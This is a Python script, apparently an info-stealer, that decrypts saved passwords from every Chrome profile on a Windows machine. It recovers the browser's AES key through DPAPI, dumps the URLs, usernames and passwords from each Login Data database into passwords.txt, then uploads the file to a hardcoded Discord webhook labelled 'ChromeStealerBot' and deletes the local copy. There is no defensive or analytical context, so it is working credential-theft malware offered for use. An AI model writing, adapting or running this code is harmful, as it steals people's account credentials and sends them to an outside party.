import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import ctypes
import shutil
import sqlite3

import requests


def get_aes():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Local State")

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)


    en_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(en_key)

    encrypted_key = encrypted_key[5:]


    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
    return decrypted_key






#print(f"AES Key: {key.hex()}")


def copy_db():
    db_path = os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Profile 2","Login Data")

    temp_path = "dbcopy.db"
    shutil.copy(db_path, temp_path)

    return temp_path





def read_db(db_file):
    connect = sqlite3.connect(db_file)
    cursor =  connect.cursor()

    cursor.execute(" SELECT origin_url, username_value, password_value FROM logins")

    rows = cursor.fetchall()
    connect.close()

    return rows


def decrypt_passes(encrypted_password, key):
    try:
        if encrypted_password.startswith(b'v10'):
            iv = encrypted_password[3:15]
            payload=encrypted_password[15:]
            cipher = AES.new(key , AES.MODE_GCM , iv)
            decrypted_pass = cipher.decrypt(payload)[:-16]


            return decrypted_pass.decode()
        
    except:
        return "[Dedcryption Fauiled]"



def extract_passwords_from_profiles():
    user_data_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
    key = get_aes()
    output_lines = []
    for folder in os.listdir(user_data_path):
        profile_path = os.path.join(user_data_path, folder)
        db_path = os.path.join(profile_path, "Login Data")
        if folder.startswith("Profile") and os.path.isfile(db_path):
            header = f"\nExtracting from: {folder}\n{'='*40}"
            print(header)
            output_lines.append(header)
            # Use the correct db_path for each profile
            db_file = "dbcopy.db"
            shutil.copy(db_path, db_file)
            entries = read_db(db_file)
            for origin_url, username_value, password_value in entries:
                dec_pass = decrypt_passes(password_value, key)
                if username_value or dec_pass:
                    entry = f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}"
                    print(entry)
                    output_lines.append(entry)
            os.remove(db_file)
    # Write all output to a file
    with open("passwords.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(output_lines))



def send_to_discord(file_path, webhook_url):
    with open(file_path, "rb") as f:
        payload = {
            "content": "Success",
            "username": "ChromeStealerBot"
        }
        files = {
            "file": (os.path.basename(file_path), f)
        }
        response = requests.post(webhook_url, data=payload, files=files)

    if response.status_code == 204:
        print("✅ File sent successfully.")
    if response.status_code == 200:
        print("✅ File sent successfully.")
    else:
        print(f"❌ Failed to send: {response.status_code}")





'''
def extract_passwords_from_profiles():
    user_data_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
    key = get_aes()
    for folder in os.listdir(user_data_path):
        profile_path = os.path.join(user_data_path, folder)
        db_path = os.path.join(profile_path, "Login Data")
        if folder.startswith("Profile") and os.path.isfile(db_path):
            print(f"\nExtracting from: {folder}\n{'='*40}")
            db_file = copy_db()
            entries = read_db(db_file)
            for origin_url, username_value, password_value in entries:
                dec_pass = decrypt_passes(password_value, key)
                if username_value or dec_pass:
                    print(f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}")
            os.remove(db_file)


'''



if __name__ == "__main__":
    extract_passwords_from_profiles()



send_to_discord("passwords.txt", "https://discord.com/api/webhooks/1401270561782501477/s1TSaeTOk8RuHhM4WDQRse8LSUjt4IA-zMgXOL1Y-r16ApgAN72mDczE5eKYBWnwUvuR")
os.remove("passwords.txt")

'''key = get_aes()
db_file = copy_db()
entries = read_db(db_file)


for origin_url, username_value, password_value in entries:
    dec_pass = decrypt_passes(password_value, key)
    if username_value or dec_pass:
        print(f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}")'''